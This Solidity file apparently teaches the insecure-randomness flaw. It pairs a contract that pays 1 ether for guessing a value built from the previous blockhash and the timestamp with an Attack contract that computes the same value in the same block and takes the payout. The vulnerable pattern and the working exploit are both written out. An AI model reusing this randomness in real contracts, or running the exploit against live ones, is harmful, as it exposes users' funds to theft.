// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// both contracts are executed in the same block.
// so both blockhash(block.number-1) & block.timestamp
// will be the same in both contract

contract GuessRandomNumber {
    constructor() {}

    function guess(uint _guess) public {
        // blockhash(block.number-1) this returns hash of previous block
        uint ans = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
        if (_guess == ans) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send ether");
        }
    }
}

contract Attack {
    uint balance;

    function attack(GuessRandomNumber guessRandomNumber) public {
        uint ans = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
        guessRandomNumber.guess(ans);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    receive() external payable {
        balance += msg.value;
    }
}
